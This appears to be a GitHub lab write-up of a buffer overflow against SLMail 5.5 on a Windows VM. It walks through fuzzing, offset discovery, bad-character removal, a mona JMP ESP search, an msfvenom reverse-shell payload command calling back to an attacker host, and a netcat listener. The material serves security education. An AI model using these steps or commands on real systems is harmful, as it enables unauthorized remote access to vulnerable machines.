# Windows Buffer Overflow

## Objective:
This project is centered on understanding and executing a Windows buffer overflow. By targeting a specific Windows virtual machine, the project aimed to shed light on the intricacies of buffer overflow vulnerabilities in a Windows environment, emphasizing the steps and tools necessary to exploit such flaws. The key objectives of the project are detailed below:
- **Manual Buffer Overflow:** Engaging in a step-by-step process to perform a buffer overflow against a Windows target, understanding the specific conditions and elements that lead to successful exploitation.
- **Immunity Debugger Integration:** Leveraging the Immunity Debugger to trace and understand the buffer overflow process in real time. This involved attaching specific processes to the debugger and observing program behavior during exploitation attempts.
- **Character Testing and EIP Control:** Using a fuzzer script to determine the exact point of EIP overwrite, followed by a systematic approach to identifying and removing bad characters to ensure the crafted payload's effectiveness.
- **Payload Crafting and Exploitation:** Utilizing MSFvenom to generate a specific payload, followed by setting breakpoints and adjusting scripts to gain control over the program's execution. Successfully exploiting the vulnerability led to obtaining a reverse shell on the target machine.

## Walkthrough:
- Initialized the BOF machine, accessed the command prompt as an administrator, and ran “slmgr /rearm” and “ipconfig” to determine the machine's IP address as “10.0.2.10”.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF1.png" alt="">
</p>


- Installed “12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe” on the Windows VM, rebooted it, and created a desktop shortcut for “SLmail.cpl”.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF2.png" alt="">
</p>


- Opened both “SLmail.cpl” & “Immunity debugger” with administrative rights.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF3.png" alt="">
</p>


- In “Immunity debugger”, attached the “SLmail.exe” file and ensured it's actively running.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF4-1.png" alt="">
</p>
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF4-2.png" alt="">
</p>

- On my Kali machine, downloaded the fuzzer script labeled “fuzzerScript.py” and stored it in a “BOF” folder on my desktop.

<p align="center">
  <img src="" alt="">
</p>


- In the same folder, created and edited a file named “fuzzy.py”. Line 13 requires the target IP address and port number.

<p align="center">
  <img src="" alt="">
</p>


- Conducted an nmap scan on the target VM to confirm open ports and noted the active “pop3” protocol.

<p align="center">
  <img src="" alt="">
</p>


- Updated “fuzzy.py” with the target IP address and port, then saved changes.

<p align="center">
  <img src="" alt="">
</p>


- Navigated to the BOF directory and executed the “fuzzy.py” script using the “python2 fuzzy.py” command.

<p align="center">
  <img src="" alt="">
</p>


- Observed the EIP update to “41414141” in Immunity debugger.

<p align="center">
  <img src="" alt="">
</p>


- Generated an MSF pattern of 3000 bytes using the “msf-pattern_create -l 3000” command to pinpoint control flow locations.

<p align="center">
  <img src="" alt="">
</p>


- Updated the “fuzzy.py” script's buffer with the generated MSF pattern and removed unnecessary loops.

<p align="center">
  <img src="" alt="">
</p>


- Reset SLmail.cpl and the Immunity debugger, re-executed the “fuzzy.py” script, and noted the updated EIP value in Immunity debugger.

<p align="center">
  <img src="" alt="">
</p>


- Determined the exact memory offset using the “msf-pattern_offset -l 3000 -q 39694438” command.

<p align="center">
  <img src="" alt="">
</p>


- Validated the offset by adjusting the buffer in “fuzzy.py” and observing the Immunity debugger's EIP value.

<p align="center">
  <img src="" alt="">
</p>


- Incorporated a list of potential bad characters into the “fuzzy.py” buffer to refine the exploit.

<p align="center">
  <img src="" alt="">
</p>


- Re-executed the adjusted “fuzzy.py” script and followed the ESP in dump within Immunity debugger to identify and remove any bad characters.

<p align="center">
  <img src="" alt="">
</p>


- Identified certain characters as "bad" and removed them from the "fuzzy.py" buffer.

<p align="center">
  <img src="" alt="">
</p>


- Re-executed the "fuzzy.py" script with the refined buffer and monitored the outcome in Immunity debugger.

<p align="center">
  <img src="" alt="">
</p>


- Searched for mona modules using the “!mona modules” command and identified a suitable dll with “!mona find -s "\xff\xe4" -m SLMFC.DLL”.

<p align="center">
  <img src="" alt="">
</p>


- Crafted a shell code using the “msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"” command.

<p align="center">
  <img src="" alt="">
</p>


- Integrated the shell code into “fuzzy.py” and adjusted the buffer accordingly.

<p align="center">
  <img src="" alt="">
</p>


- Established a netcat listener on the Kali machine using “nc -lvp 4444”.

<p align="center">
  <img src="" alt="">
</p>


- Restarted SLmail, ran the “fuzzy.py” script, and achieved system access with highest-level permissions as confirmed by the “whoami” command.

<p align="center">
  <img src="" alt="">
</p>

